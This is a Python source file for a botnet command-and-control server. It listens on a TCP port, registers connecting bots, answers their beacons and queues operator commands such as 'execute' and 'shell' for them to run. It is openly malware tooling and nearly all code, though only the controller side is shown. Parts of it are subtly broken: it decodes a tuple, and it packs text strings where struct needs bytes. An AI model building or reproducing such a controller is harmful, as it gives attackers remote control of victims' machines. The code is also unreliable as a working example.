import socket
import sys
import struct
from time import sleep
from threading import Thread

commands = ["get os","test","execute","shell"]
inter = 5
check_list = []
botnet = []
command = ""
has_cmd = 0 # 1 --> True 0 --> False

def beacon_handler(s):
    global inter,command,has_cmd
    try:
        pkt = s.recv(4096)
        len_meta_data = len(pkt) - 4
        data = struct.unpack("<HH",pkt[len_meta_data:])
        if data[0] == 1:
            cmd_data = struct.unpack("<%ds"%(len_meta_data),pkt[:len_meta_data])
            cmd_data = cmd_data.decode()
            # Print output
            if has_cmd == 1:
                beacon_pkt = struct.pack("<%dsHH"%(len(command)),command,has_cmd,inter)
        elif data[0] == 0:
            if has_cmd == 1:
                beacon_pkt = struct.pack("<%dsHH"%(len(command)),command,has_cmd,inter)
            else:
                beacon_pkt = struct.pack("<HH",has_cmd,inter)
        s.send(beacon_pkt)
        return
    except Exception as ee:
        print("[*] Error in beacon_handler : %s"%(str(ee)))
        sys.exit(0)

def create_checklist():
    global botnet,check_list
    check_list = botnet

def check_command():
    global command,has_cmd
    if command != "":
        has_cmd = 1

def check_bot(addr):
    global botnet
    for bot in botnet:
        if addr == bot:
            return
    botnet.append(addr)
    print("[*] New bot %s added"%(addr))

def start_server(ip="127.0.0.1",port=2003):
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.bind((ip,port))
        s.listen(5)
        while True:
            #print("[*] Listening...")
            bot,addr = s.accept()
            check_bot(str(addr))
            print("[*] Beacon from %s received"%(str(addr[0])))
            beacon_handler_thread = Thread(target=beacon_handler,args=(bot,))
            beacon_handler_thread.start()
            #print("[*] beacon_thread started")
    except Exception as e:
        print("[*] Error in start_server : %s"%(str(e)))
        sys.exit(0)

def check_valid_command(cmd):
    global commands
    for c in commands:
        if c in cmd:
            return True
    return False

def process_cmd(cmd):
    global command,has_cmd
    if check_valid_command(cmd):
        has_cmd = 1
        command = cmd
    else:
        print("[*] Invalid Command")
        return


def main():
    try:
        server_thread = Thread(target=start_server,args=())
        server_thread.start()
        print("[*] Server started!")
        while True:
            cmd = input(">>")
            process_cmd(cmd)
    except Exception as e:
        print("[*] Error in main : %s"%(str(e)))
        sys.exit(0)

if __name__ == '__main__':
    main()
